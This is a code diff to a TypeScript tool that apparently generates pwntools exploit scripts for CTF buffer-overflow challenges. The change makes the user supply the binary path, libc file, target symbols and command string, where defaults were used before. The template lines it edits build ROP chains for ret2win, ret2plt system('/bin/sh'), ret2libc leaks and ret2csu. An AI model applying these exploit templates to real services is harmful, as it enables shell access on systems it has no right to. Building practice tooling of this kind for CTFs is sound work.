@@ -127,6 +127,11 @@ function expSymbol(value: string, label: string): string {
   if (!/^[A-Za-z_][\w@.]*$/.test(value)) throw new Error(label + " 请填函数或符号名称。");
   return expQuoted(value);
 }
+function expRequired(value: string | undefined, label: string): string {
+  const s=(value || "").trim();
+  if(!s) throw new Error(label+"不能为空。");
+  return s;
+}
 function expBytes(value: string): string {
   const bytes: number[] = [];
   for (let i=0; i<value.length;) {
@@ -147,6 +152,7 @@ function expBytes(value: string): string {
 }
 function generateExp(kind: ExpKind, v: ExpValues): string {
   const recipe = EXP_RECIPES[kind];
+  if (!recipe) throw new Error("未知的模板。");
   const arch = v.arch === "i386" ? "i386" : "amd64";
   if (recipe.amd64Only && arch !== "amd64") throw new Error("这个模板仅支持 amd64。");
   const offset = expNumber(v.offset || "", "返回地址偏移", true);
@@ -162,7 +168,7 @@ function generateExp(kind: ExpKind, v: ExpValues): string {
     "from pwn import *", "from pathlib import Path", "",
     "context.clear(arch=" + expQuoted(arch) + ", os='linux')",
     "context.timeout = 3",
-    "BINARY = " + expQuoted(v.binary || "./pwn"),
+    "BINARY = " + expQuoted(expRequired(v.binary, "题目附件路径")),
     "OFFSET = " + offset + "  # cyclic + GDB 实测，不等于局部数组大小",
     "ELF_BASE = " + base + "  # PIE 时填写当前进程已确认的基址",
     "PROMPT = " + expBytes(v.prompt || ""),
@@ -170,7 +176,7 @@ function generateExp(kind: ExpKind, v: ExpValues): string {
     "ALIGN_STAGE1 = " + align1,
     "ALIGN_STAGE2 = " + align2,
     "LOADER = " + expQuoted(v.loader || ""),
-    "LIBC_PATH = " + expQuoted(usesLibc ? (v.libc || "./libc.so.6") : ""),
+    "LIBC_PATH = " + expQuoted(usesLibc ? expRequired(v.libc, "libc 文件") : ""),
     "", "elf = ELF(BINARY, checksec=False)",
     "if elf.arch != " + expQuoted(arch) + ":", "    raise ValueError('架构与 ELF 不匹配')", "context.binary = elf",
     "if OFFSET is None:", "    raise ValueError('先填写 cyclic + GDB 测出的返回地址偏移')",
@@ -205,8 +211,8 @@ function generateExp(kind: ExpKind, v: ExpValues): string {
     "    return chain", ""
   );
   if (kind === "win") {
-    const target=expSymbol(v.target || "win","目标函数");
-    const after=expSymbol(v.reentry || "main","返回入口");
+    const target=expSymbol(expRequired(v.target,"目标函数"),"目标函数");
+    const after=expSymbol(expRequired(v.reentry,"返回入口"),"返回入口");
     const argsList = (v.arguments || "").trim() ? v.arguments.split(",").map(x=>expExpression(x,"函数参数")).join(", ") : "";
     lines.push("TARGET = " + target, "TARGET_ARGS = [" + argsList + "]", "REENTRY = " + after, "",
       "def build_payload():", "    chain = aligned_rop(ALIGN_STAGE1)",
@@ -214,9 +220,9 @@ function generateExp(kind: ExpKind, v: ExpValues): string {
       "    log.info(chain.dump())", "    return flat(b'A' * OFFSET, chain.chain())", "",
       "def main():", "    io = start()", "    send_payload(io, build_payload())", "    io.interactive()");
   } else if (kind === "plt") {
-    const after=expSymbol(v.reentry || "main","返回入口");
+    const after=expSymbol(expRequired(v.reentry,"返回入口"),"返回入口");
     const address=expNumber(v.stringAddress || "","字符串地址",true);
-    const command=ropPyBytes(Array.from(new TextEncoder().encode((v.command || "/bin/sh") + "\0")));
+    const command=ropPyBytes(Array.from(new TextEncoder().encode(expRequired(v.command,"命令字符串") + "\0")));
     lines.push("REENTRY = " + after, "STRING_ADDRESS = " + address, "COMMAND = " + command, "",
       "def build_payload():",
       "    binsh = STRING_ADDRESS if STRING_ADDRESS is not None else next(elf.search(COMMAND), None)",
@@ -226,8 +232,8 @@ function generateExp(kind: ExpKind, v: ExpValues): string {
       "    return flat(b'A' * OFFSET, chain.chain())", "",
       "def main():", "    io = start()", "    send_payload(io, build_payload())", "    io.interactive()");
   } else if (usesLibc) {
-    const symbol=expSymbol(v.leakSymbol || (kind==="libc-puts"?"puts":"write"),"泄漏符号");
-    const after=expSymbol(v.reentry || "main","第二次输入入口");
+    const symbol=expSymbol(expRequired(v.leakSymbol,"泄漏符号"),"泄漏符号");
+    const after=expSymbol(expRequired(v.reentry,"第二次输入入口"),"第二次输入入口");
     const leakBytes=expNumber(v.leakBytes || (arch==="amd64"?"6":"4"),"有效泄漏字节数");
     if (kind==="libc-puts" && (Number(leakBytes)<1 || Number(leakBytes)>(arch==="amd64"?8:4))) throw new Error("泄漏字节数超过指针宽度或小于 1。");
     const end=expBytes(v.leakEnd === undefined ? "\\n" : v.leakEnd);
@@ -268,8 +274,8 @@ function generateExp(kind: ExpKind, v: ExpValues): string {
     const pop=expNumber(v.csuPop || "","CSU pop 地址",true);
     const call=expNumber(v.csuCall || "","CSU call 地址",true);
     lines.push("CSU_POP = " + pop, "CSU_CALL = " + call,
-      "INDIRECT_SYMBOL = " + expSymbol(v.indirectSymbol || "write","间接调用符号"),
-      "REENTRY = " + expSymbol(v.reentry || "main","返回函数"),
+      "INDIRECT_SYMBOL = " + expSymbol(expRequired(v.indirectSymbol,"间接调用符号"),"间接调用符号"),
+      "REENTRY = " + expSymbol(expRequired(v.reentry,"返回函数"),"返回函数"),
       "CSU_LAYOUT = " + expQuoted(v.csuLayout === "forward" ? "forward" : "reverse"), "",
       "def csu_call(func_ptr, arg1, arg2, arg3, after):",
       "    if not CSU_POP or not CSU_CALL:", "        raise ValueError('填写当前 ELF 的两段 CSU 地址')",
